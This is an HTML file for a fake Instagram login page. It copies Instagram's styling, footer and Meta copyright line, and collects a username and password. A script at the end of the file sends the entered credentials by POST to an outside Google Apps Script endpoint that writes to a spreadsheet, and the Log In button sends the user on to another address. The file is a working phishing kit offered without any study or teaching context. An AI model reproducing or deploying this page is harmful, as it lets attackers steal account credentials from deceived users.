<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Instagram-like Form Submit to Google Sheet</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <script>
        function redirectToLink() {
            // Change the URL below to the desired link
            window.location.href = "https://example.com";
        }
    </script>
    <style>
        body{
          overflow-y: hidden;
        }
       @media screen and (max-width: 600px) {
      
            /* Adjust styles for smaller screens here */
            #container {
                margin:  auto;
                overflow-x: hidden;
                
            }

            .main-top {
                width: 80%;
                padding: 20px;
            }

            .images img {
                margin: 5px;
                height: 25px;
            }

            footer {
                width: 90%;
            }
        }
    * {
    margin: 0px;
    padding: 0px;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #eee;

    overflow-y: auto;
}

#container {
    display: flex;
    align-items: center;
    margin: 50px auto;
    flex-direction: column;
}

section {
    margin: 20px 5;

}

.main-top {
    width: 350px;
    text-align: center;
    margin-bottom: 5px;
    padding: 50px 50px;
    background-color: #fff;
}

.logo {
    margin-bottom: 5px;
}

.logo img {
    height: 50px;
    margin: 0 auto;
}

.username,
.password {
    width: 100%;
    margin-bottom: 5px;
    padding: 8px 12px;
    border: 1px solid #dbdbdb;
    font-size: 15px;
    border-radius: 3px;
}

input:focus {
    outline: none;
}

.login-btn {
    width: 100%;
    background-color: #3897f0;
    border: 1px solid #3897f0;
    padding: 6px 0;
    color: #fff;
    cursor: pointer;
    border-radius: 3px;
}

.or {
    line-height: 50px;
}

.main-bottom a {
    margin: 20px 0;
    text-decoration: none;
    font-size: 15px;
    line-height: 30px;
}

.fa-facebook-f {
    color: #fff;
    border-radius: 2px;
    font-size: 12px;
    background-color: rgb(15, 15, 168);
    width: 20px;
    text-align: center;
    height: 20px;
    padding: 5px;
}

.bottom {
    width: 350px;
    text-align: center;
    padding: 20px 0;
    background-color: #fff;
}

.signUp a {
    text-decoration: none;
    cursor: pointer;
    color: #3897f0;
}

.app-section {
    text-align: center;
    padding: 10px 0;
}

.app-section span {
    font-size: 16px;
}

.images {
    margin: 10px 0;
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
}

.images img {
    margin: 0 5px;
    height: 35px;
}

footer {
    width: 70%;
    text-align: center;
    margin-top: 2rem;
}

footer a,
footer span,
footer select {
    font-size: 13px;
    color: #8e8e8e;
    text-decoration: none;
    margin: 5px;
}

footer select {
    outline: none;
    border: none;
    background-color: #eee;
}

        .form-control {
            width: 100%;
    margin-bottom: 5px;
    padding: 8px 12px;
    border: 1px solid #dbdbdb;
    font-size: 15px;
    border-radius: 3px;
        }

        .btn-primary {
            width: 100%;
    background-color: #3897f0;
    border: 1px solid #3897f0;
    padding: 6px 0;
    color: #fff;
    cursor: pointer;
    border-radius: 3px;
        }
    </style>
</head>

<body>
    <div id="container">
        <section>
           
            <div class="main-top">
                <div class="logo">
                    <img src="images.png" />
                </div>
           
                <form name="submit-to-google-sheet" >
                    <div class="mb-3">
                        <input name="fullname" type="text" class="form-control" placeholder="Username" required>
                    </div>

                    <div class="mb-3">
                        <input name="email" type="password" class="form-control" placeholder="Password" required>
                    </div>

                    <button type="submit"  onclick="redirectToLink()" class="btn btn-primary">Log In</button>
                </form>
                <span class="or"> OR </span>

                <div class="main-bottom">
                    <a href="" class="logInFB"><i class="fa-brands fa-facebook-f"></i> Log in with Facebook </a><br>
                    <a href="" class="forget"> Forgot password </a>
                </div>
    
    
            </div>
            <div class="bottom">
                <div class="signUp">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
            </div>
            <div class="app-section">
                <span> Get the app </span>
                <div class="images">
                    <img src="download.png" alt="googlePlay Image">
                    <img src="EHY6QnZYdNX.png" alt="Microsoft Image">
                </div>
            </div>
        </form>
   
        </section>
    
        <!-- Footer Section Starts from Here -->
        <footer>
            <a href="">Meta</a>
            <a href="">About</a>
            <a href="">Blog</a>
            <a href="">Jobs</a>
            <a href="">Help</a>
            <a href="">API</a>
            <a href="">Privacy</a>
            <a href="">Terms</a>
            <a href="">Top Accounts</a>
            <a href="">Locations</a>
            <a href="">Instagram Lite</a>
            <a href="">Instagram Contact</a>
            <a href="">Uploading & Non-Users</a>
            <div class="bottom-footer">
                <select name="" id="">
                    <option value="English">English</option>
                    <option value="Hindi">Hindi</option>
                    <option value="Punjabi">Punjabi</option>
                    <option value="Urdu">Urdu</option>
                    <option value="Francais">Francais</option>
                </select>
                <span> &copy; 2023 Instagram from Meta</span>
            </div>
        </footer>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbyOvhrDM_NnrImvTLHYaqaXqGJmVvWV7A1dIu59QoQjk6qFMeZdQiPplt42zDJJ2JGqKw/exec'
        const form = document.forms['submit-to-google-sheet']

        form.addEventListener('submit', e => {
            e.preventDefault()
            fetch(scriptURL, {
                    method: 'POST',
                    body: new FormData(form)
                })
                .then(response => console.log('Success!', response))
                .catch(error => console.error('Error!', error.message))
        })
    </script>
    
</body>

</html>
